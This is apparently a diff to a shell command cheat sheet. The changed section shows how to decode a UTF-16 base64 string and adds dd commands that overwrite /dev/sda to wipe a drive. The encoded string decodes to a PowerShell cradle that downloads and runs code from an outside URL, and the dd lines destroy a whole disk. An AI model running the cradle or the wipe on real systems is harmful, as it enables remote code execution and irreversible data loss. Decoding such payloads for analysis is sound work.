@@ -12,3 +12,9 @@
 ## Convert base64 to single-byte unicode
 ```echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8```
 
+# Securely wipe a drive
+```
+dd if=/dev/urandom of=/dev/sda status=progress
+dd if=/dev/zero of=/dev/sda status=progress
+dd if=/dev/urandom of=/dev/sda status=progress
+```
